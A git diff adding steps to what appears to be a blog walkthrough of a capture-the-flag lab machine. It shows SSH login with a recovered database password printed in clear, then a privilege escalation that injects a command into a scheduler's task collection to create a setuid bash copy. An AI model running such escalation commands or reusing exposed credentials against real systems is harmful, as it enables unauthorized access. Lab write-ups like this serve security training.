@@ -149,6 +149,9 @@ const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?aut
 
 We can use the credential for SSH connection.
 {% highlight shell %}
+mark:5AYRft73VtFpc84k
+{% endhighlight %}
+{% highlight shell %}
 root@kali:~# ssh mark@10.10.10.58
 mark@10.10.10.58's password: 
 
@@ -197,6 +200,38 @@ total 12
 drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
 drwxr-xr-x 3 root root 4096 Sep  3  2017 mark
 drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
+{% endhighlight %}
+
+If take a look at the processes, we can see 2 processes by another user "tom".
+{% highlight shell %}
+mark@node:~$ ps aux | grep tom
+tom       1211  0.0  5.8 1074616 44232 ?       Ssl  19:31   0:03 /usr/bin/node /var/scheduler/app.js
+tom       1231  0.0  6.6 1024156 50068 ?       Ssl  19:31   0:04 /usr/bin/node /var/www/myplace/app.js
+mark      1610  0.0  0.1  14228  1020 pts/0    S+   23:05   0:00 grep --color=auto tom
+{% endhighlight %}
+
+
+{% highlight shell %}
+mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
+MongoDB shell version: 3.2.16
+connecting to: scheduler
+> db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tbash; /bin/chown tom:admin /tmp/tbash; chmod g+s /tmp/tbash; chmod u+s /tmp/tbash"});
+WriteResult({ "nInserted" : 1 })
+> exit
+bye
+{% endhighlight %}
+
+
+{% highlight shell %}
+mark@node:/tmp$ ./tbash -p
+tbash-4.3$ id
+uid=1001(mark) gid=1001(mark) euid=1000(tom) egid=1002(admin) groups=1002(admin),1001(mark)
+{% endhighlight %}
+
+
+Launch a netcat listener.
+{% highlight shell %}
+
 {% endhighlight %}
 
 ## 3. Getting Root
